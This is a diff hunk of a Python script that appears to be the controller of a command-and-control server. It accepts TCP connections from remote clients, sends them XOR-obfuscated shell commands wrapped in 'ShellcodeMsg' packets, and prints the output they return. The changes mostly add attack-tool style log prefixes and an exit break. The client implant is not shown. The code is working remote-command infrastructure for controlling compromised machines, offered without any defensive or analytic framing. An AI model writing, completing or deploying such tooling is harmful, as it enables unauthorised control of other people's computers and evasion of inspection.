@@ -66,53 +66,57 @@ def xor_cipher(data, key):
         data = data.encode('utf-8')  # Convert string to bytes        
     return bytes([b ^ key for b in data])  # Apply XOR for each byte
 
-
+# Client handling function
 def handle_client(client_socket, client_address):
     try:
-        print(f"Handling client {client_address}")
-
+        print(f"[+] Accepted connection from {client_address[0]}:{client_address[1]}")
         while True:
-            print("Enter a command (exec, wait, exit): ", end='', flush=True)
+            print("cmd (exec, wait, exit) > ", end='', flush=True)
             user_input = input().strip()
 
             if user_input == "exit":
                 msg = ShellcodeMsg(command=cmd_exit)
                 client_socket.send(msg.pack())
+                print("[*] Sent exit command.")
+                break
             elif user_input == "wait":
                 msg = ShellcodeMsg(command=cmd_wait)
                 client_socket.send(msg.pack())
+                print("[*] Sent wait command.")
             elif user_input == "exec":
-                print("Enter a command to execute:", end='', flush=True)
+                print("cmdline > ", end='', flush=True)
                 command = input().strip()
                 buffer = xor_cipher(command, cipher_key)
                 msg = ShellcodeMsg(command=cmd_exec, key=cipher_key, buffer=buffer)
                 client_socket.send(msg.pack())
-                output = client_socket.recv(buffer_size)
-                print(output)
+                print("[*] Sent exec command.")
 
+                # Receive output from the client
+                output = client_socket.recv(buffer_size)
+                print(f"[+] Output: {output}")
             else:
-                print(f"Invalid option: {user_input}")
+                print(f"[!] Invalid option: {user_input}")
                 continue
 
             # Small delay to avoid tight loop
             time.sleep(0.2)
 
     except Exception as e:
-        print(f"Error handling client {client_address}: {e}")
+        print(f"[!] Error handling client {client_address[0]}:{client_address[1]}: {e}")
 
     finally:
-        print(f"Client {client_address} disconnected.")
+        print(f"[*] Client {client_address[0]}:{client_address[1]} disconnected.")
         client_socket.close()
 
+# Server startup function
 def start_server(server_ip, server_port):
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind((server_ip, server_port))
     server.listen(5)
-    print(f"Server listening on {server_ip}:{server_port}")
+    print(f"[*] Server listening on {server_ip}:{server_port}")
 
     while True:
         client_socket, client_address = server.accept()
-        print(f"Accepted connection from {client_address}")
         handle_client(client_socket, client_address)
 
 if __name__ == "__main__":
